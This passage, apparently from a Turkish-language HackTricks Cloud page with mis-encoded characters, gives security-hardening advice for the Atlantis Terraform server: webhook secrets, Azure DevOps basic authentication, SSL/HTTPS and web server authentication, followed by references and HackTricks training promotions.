#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis, `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ortam deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla ayarlanmÄ±ÅŸ Webhook secret'larÄ± ile Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r. `--repo-allowlist` bayraÄŸÄ± ayarlÄ± olsa bile, bir webhook secret'Ä± olmadan, saldÄ±rganlar izin verilen bir repo gibi davranarak Atlantis'e istek gÃ¶nderebilir. Webhook secret'larÄ±, webhook isteklerinin gerÃ§ekten VCS saÄŸlayÄ±cÄ±nÄ±zdan (GitHub veya GitLab) geldiÄŸini garanti eder.

EÄŸer Azure DevOps kullanÄ±yorsanÄ±z, webhook secret'larÄ± yerine temel bir kullanÄ±cÄ± adÄ± ve ÅŸifre ekleyin.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps, tÃ¼m webhook olaylarÄ±nda temel kimlik doÄŸrulama baÅŸlÄ±ÄŸÄ± gÃ¶ndermeyi destekler. Bu, webhook konumunuz iÃ§in HTTPS URL'si kullanmayÄ± gerektirir.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

EÄŸer webhook secret'larÄ± kullanÄ±yorsanÄ±z ama trafiÄŸiniz HTTP Ã¼zerinden geÃ§iyorsa, webhook secret'larÄ± Ã§alÄ±nabilir. `--ssl-cert-file` ve `--ssl-key-file` bayraklarÄ±nÄ± kullanarak SSL/HTTPS'yi etkinleÅŸtirin.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Web hizmetinde kimlik doÄŸrulamayÄ± etkinleÅŸtirmek ÅŸiddetle Ã¶nerilir. `--web-basic-auth=true` kullanarak BasicAuth'u etkinleÅŸtirin ve `--web-username=yourUsername` ve `--web-password=yourPassword` bayraklarÄ±nÄ± kullanarak bir kullanÄ±cÄ± adÄ± ve ÅŸifre ayarlayÄ±n.

AyrÄ±ca bunlarÄ± ortam deÄŸiÅŸkenleri olarak da geÃ§ebilirsiniz `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` ve `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
